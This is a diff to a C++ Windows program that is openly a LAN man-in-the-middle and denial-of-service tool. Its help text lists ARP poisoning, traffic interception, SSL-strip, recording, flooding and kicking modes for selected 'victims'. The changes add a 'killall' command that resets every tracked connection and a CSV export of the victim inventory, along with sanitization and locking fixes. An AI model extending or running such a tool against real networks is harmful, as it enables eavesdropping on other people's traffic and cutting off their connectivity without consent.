@@ -770,6 +770,11 @@ static void fingerprintVictim(std::string ip) {
     if (p22)        banner = tcpBanner(ip, 22, "", 400);
     else if (p80)   banner = tcpBanner(ip, 80, "HEAD / HTTP/1.0\r\n\r\n", 500);
     else if (p8008) banner = tcpBanner(ip, 8008, "HEAD / HTTP/1.0\r\n\r\n", 500);
+    // banner is shipped to the GUI inside a '|' delimited line; keep it on one
+    // printable line so a chatty server cannot corrupt the protocol
+    for (auto& ch : banner)
+        if (ch == '|' || ch == '\r' || ch == '\n' || ch == '\t') ch = ' ';
+    if (banner.size() > 120) banner.resize(120);
 
     std::string os;
     if (p8008 || p8009)          os = "Google Cast / Android TV";
@@ -3221,36 +3226,38 @@ static void startScan() {
 }
 
 static void selectTargets(const std::string& spec) {
-    std::lock_guard<std::mutex> lk(g_vmutex);
-    if (spec == "all") {
-        for (auto& v : g_victims) v.sel = true;
-    } else if (spec == "none") {
-        for (auto& v : g_victims) v.sel = false;
-    } else {
-        std::stringstream ss(spec);
-        std::string tok;
-        while (std::getline(ss, tok, ',')) {
-            tok = trim(tok);
-            if (tok.empty()) continue;
-            size_t dash = tok.find('-');
-            if (dash != std::string::npos) {
-                int a = atoi(tok.substr(0, dash).c_str());
-                int b = atoi(tok.substr(dash + 1).c_str());
-                if (a > b) std::swap(a, b);
-                for (int i = a; i <= b; ++i)
-                    if (i >= 1 && i <= (int)g_victims.size())
-                        g_victims[i - 1].sel = true;
-            } else if (tok.find('.') != std::string::npos) {
-                for (auto& v : g_victims) if (v.ip == tok) v.sel = true;
-            } else {
-                int idx = atoi(tok.c_str());
-                if (idx >= 1 && idx <= (int)g_victims.size())
-                    g_victims[idx - 1].sel = true;
+    int n = 0;
+    {
+        std::lock_guard<std::mutex> lk(g_vmutex);
+        if (spec == "all") {
+            for (auto& v : g_victims) v.sel = true;
+        } else if (spec == "none") {
+            for (auto& v : g_victims) v.sel = false;
+        } else {
+            std::stringstream ss(spec);
+            std::string tok;
+            while (std::getline(ss, tok, ',')) {
+                tok = trim(tok);
+                if (tok.empty()) continue;
+                size_t dash = tok.find('-');
+                if (dash != std::string::npos) {
+                    int a = atoi(tok.substr(0, dash).c_str());
+                    int b = atoi(tok.substr(dash + 1).c_str());
+                    if (a > b) std::swap(a, b);
+                    for (int i = a; i <= b; ++i)
+                        if (i >= 1 && i <= (int)g_victims.size())
+                            g_victims[i - 1].sel = true;
+                } else if (tok.find('.') != std::string::npos) {
+                    for (auto& v : g_victims) if (v.ip == tok) v.sel = true;
+                } else {
+                    int idx = atoi(tok.c_str());
+                    if (idx >= 1 && idx <= (int)g_victims.size())
+                        g_victims[idx - 1].sel = true;
+                }
             }
         }
+        for (auto& v : g_victims) if (v.sel) n++;
     }
-    int n = 0;
-    for (auto& v : g_victims) if (v.sel) n++;
     PF("[+] %d target(s) selected\n", n);
 }
 
@@ -3333,10 +3340,12 @@ static void loadManualNames() {
 
 static void cmdName(const std::string& ip, const std::string& name) {
     if (ip.empty()) { PF("usage: name <ip> <text|clear>\n"); return; }
+    std::string clean = name;
+    if (!clean.empty() && clean != "clear" && clean != "-") sanitizeName(clean);
     {
         std::lock_guard<std::mutex> lk(g_manualMutex);
-        if (name.empty() || name == "clear" || name == "-") g_manualNames.erase(ip);
-        else g_manualNames[ip] = name;
+        if (clean.empty() || clean == "clear" || clean == "-") g_manualNames.erase(ip);
+        else g_manualNames[ip] = clean;
     }
     // rewrite the file from the current map so entries stay unique
     {
@@ -3352,16 +3361,16 @@ static void cmdName(const std::string& ip, const std::string& name) {
         std::lock_guard<std::mutex> lk(g_vmutex);
         for (auto& v : g_victims)
             if (v.ip == ip) {
-                if (name.empty() || name == "clear" || name == "-") {
+                if (clean.empty() || clean == "clear" || clean == "-") {
                     v.name.clear(); v.namePrio = 0;
-                } else { v.name = name; v.namePrio = 9; }
+                } else { v.name = clean; v.namePrio = 9; }
                 break;
             }
     }
-    if (name.empty() || name == "clear" || name == "-")
+    if (clean.empty() || clean == "clear" || clean == "-")
         PF("[+] name cleared for %s\n", ip.c_str());
     else
-        PF("[+] %s is now \"%s\" (manual, saved)\n", ip.c_str(), name.c_str());
+        PF("[+] %s is now \"%s\" (manual, saved)\n", ip.c_str(), clean.c_str());
 }
 
 static const char* nameSource(int prio) {
@@ -3376,6 +3385,59 @@ static const char* nameSource(int prio) {
         case 0:  return "vendor";
         default: return "?";
     }
+}
+
+static std::string csvField(const std::string& s) {
+    bool quote = false;
+    for (char c : s) {
+        if (c == ',' || c == '"' || c == '\n' || c == '\r') { quote = true; break; }
+    }
+    if (!quote) return s;
+    std::string o = "\"";
+    for (char c : s) {
+        if (c == '"') o += "\"\"";
+        else o += c;
+    }
+    o += '"';
+    return o;
+}
+
+// dump the device table as CSV so the operator can diff scans or feed the
+// inventory into a spreadsheet.  Fields mirror the GUI columns plus the raw
+// source/age values.
+static void cmdExport(const std::string& pathArg) {
+    std::string path = pathArg.empty() ? "atk\\devices.csv" : pathArg;
+    std::vector<Victim> snap;
+    { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
+    FILE* f = fopen(path.c_str(), "wb");
+    if (!f) { PF("[-] export failed: %s\n", path.c_str()); return; }
+    fprintf(f, "ip,mac,name,source,selected,age_sec,ports,os,banner\n");
+    DWORD now = GetTickCount();
+    for (auto& v : snap) {
+        DWORD age = v.lastSeen ? (now - v.lastSeen) / 1000 : 0;
+        fprintf(f, "%s,%s,%s,%s,%d,%lu,%s,%s,%s\n",
+                csvField(v.ip).c_str(), csvField(v.mac).c_str(),
+                csvField(v.name).c_str(),
+                v.name.empty() ? "-" : nameSource(v.namePrio),
+                v.sel ? 1 : 0, (unsigned long)age,
+                csvField(v.ports).c_str(), csvField(v.osGuess).c_str(),
+                csvField(v.banner).c_str());
+    }
+    fclose(f);
+    PF("[+] exported %zu device(s) to %s\n", snap.size(), path.c_str());
+}
+
+static void cmdKillAll(const std::string& who) {
+    std::string target = (who.empty() || who == "*") ? "*" : who;
+    long before = g_kills.load();
+    killMatchingConns("", target);      // empty app = every tracked connection
+    long n = g_kills.load() - before;
+    if (n <= 0)
+        PF("[-] no tracked connections for %s\n",
+           target == "*" ? "any device" : target.c_str());
+    else
+        PF("[+] reset %ld connection(s) for %s\n", n,
+           target == "*" ? "all devices" : target.c_str());
 }
 
 static void saveRules() {
@@ -3421,12 +3483,16 @@ static void cmdUsers() {
         std::lock_guard<std::mutex> lk(g_vmutex);
         for (auto& v : g_victims) if (!v.name.empty()) names[v.ip] = v.name;
     }
-    std::lock_guard<std::mutex> lk(g_activityMutex);
-    if (g_activity.empty()) { PF("  (no activity yet)\n"); return; }
+    std::vector<Activity> acts;
+    {
+        std::lock_guard<std::mutex> lk(g_activityMutex);
+        if (g_activity.empty()) { PF("  (no activity yet)\n"); return; }
+        acts.reserve(g_activity.size());
+        for (auto& kv : g_activity) acts.push_back(kv.second);
+    }
     PF("  %-16s %-18s %-6s %-6s %-6s %-8s\n",
        "IP", "NAME", "DNS", "SNI", "HTTP", "AGE");
-    for (auto& kv : g_activity) {
-        auto& a = kv.second;
+    for (auto& a : acts) {
         DWORD age = a.lastSeen ? (GetTickCount() - a.lastSeen) / 1000 : 0;
         auto it = names.find(a.ip);
         std::string nm = (it != names.end()) ? it->second : "-";
@@ -4401,7 +4467,8 @@ static void help() {
         "    i | status                show counters\n"
         "    f                         toggle IP forwarding\n"
         "    restore                   repair ARP without stopping\n"
-        "    hosts                     list discovered devices\n"
+        "    hosts                     list discovered devices (source + age)\n"
+        "    export [file.csv]         write the device table (default atk\\devices.csv)\n"
         "    names                     re-resolve device names\n"
         "  MODES\n"
         "    1 intercept  2 tap  3 block  4 record  5 strip(=1)  6 dos\n"
@@ -4428,6 +4495,7 @@ static void help() {
         "    msgtest                   check that the portal answers locally\n"
         "  MISC\n"
         "    kick <ip> | unkick | dosrate <pkts/s>\n"
+        "    killall [ip|*]            RST every tracked connection (default *)\n"
         "    flood <ip> [pps]          start a DoS at an explicit rate\n"
         "    sweep [ms]                ARP re-poison interval (default 4000)\n"
         "    q                         quit\n"
@@ -4579,15 +4647,21 @@ int main(int argc, char** argv) {
             continue;
         }
         if (line == "hosts") {
-            std::lock_guard<std::mutex> lk(g_vmutex);
-            PF("  %-3s %-15s %-17s %-26s %-9s %s\n", "#", "IP", "MAC", "NAME", "SOURCE", "SEL");
-            for (size_t i = 0; i < g_victims.size(); ++i) {
-                std::string nm = g_victims[i].name.empty() ? "-" : g_victims[i].name;
-                PF("  %-3zu %-15s %-17s %-26s %-9s %s\n", i + 1,
-                   g_victims[i].ip.c_str(), g_victims[i].mac.c_str(),
-                   nm.c_str(),
-                   g_victims[i].name.empty() ? "-" : nameSource(g_victims[i].namePrio),
-                   g_victims[i].sel ? "[x]" : "[ ]");
+            // snapshot first: never print while holding g_vmutex (the capture
+            // thread needs it for every newly seen device)
+            std::vector<Victim> snap;
+            { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
+            DWORD now = GetTickCount();
+            PF("  %-3s %-15s %-17s %-26s %-9s %-7s %s\n",
+               "#", "IP", "MAC", "NAME", "SOURCE", "AGE", "SEL");
+            for (size_t i = 0; i < snap.size(); ++i) {
+                std::string nm = snap[i].name.empty() ? "-" : snap[i].name;
+                DWORD age = snap[i].lastSeen ? (now - snap[i].lastSeen) / 1000 : 0;
+                std::string agestr = std::to_string((unsigned long)age) + "s";
+                PF("  %-3zu %-15s %-17s %-26s %-9s %-7s %s\n", i + 1,
+                   snap[i].ip.c_str(), snap[i].mac.c_str(), nm.c_str(),
+                   snap[i].name.empty() ? "-" : nameSource(snap[i].namePrio),
+                   agestr.c_str(), snap[i].sel ? "[x]" : "[ ]");
             }
             continue;
         }
@@ -4788,6 +4862,16 @@ int main(int argc, char** argv) {
         if (line == "rules") { cmdRules(); continue; }
         if (line == "save") { saveRules(); continue; }
         if (line == "load") { loadRules(); continue; }
+        if (line == "killall" || line.rfind("killall ", 0) == 0) {
+            std::string who = line.size() > 7 ? trim(line.substr(7)) : "*";
+            cmdKillAll(who);
+            continue;
+        }
+        if (line == "export" || line.rfind("export ", 0) == 0) {
+            std::string path = line.size() > 6 ? trim(line.substr(6)) : "";
+            cmdExport(path);
+            continue;
+        }
         if (line.rfind("kick ", 0) == 0) { startDos(trim(line.substr(5))); continue; }
         if (line == "unkick") { stopAllDos(); continue; }
         if (line == "dosrate") {
@@ -4873,11 +4957,14 @@ int main(int argc, char** argv) {
         if (line == "_dump") {
             std::vector<Victim> vSnap;
             { std::lock_guard<std::mutex> lk(g_vmutex); vSnap = g_victims; }
-            for (auto& v : vSnap)
-                PF("VICTIM %s|%s|%s|%d|%s|%s|%s\n",
+            DWORD dumpNow = GetTickCount();
+            for (auto& v : vSnap) {
+                DWORD age = v.lastSeen ? (dumpNow - v.lastSeen) / 1000 : 0;
+                PF("VICTIM %s|%s|%s|%d|%s|%s|%s|%d|%lu\n",
                    v.ip.c_str(), v.mac.c_str(), v.name.c_str(),
                    v.sel ? 1 : 0, v.ports.c_str(), v.osGuess.c_str(),
-                   v.banner.c_str());
+                   v.banner.c_str(), v.namePrio, (unsigned long)age);
+            }
             int sel = 0;
             for (auto& v : vSnap) if (v.sel) sel++;
             int tracked = 0, rules_n = 0;
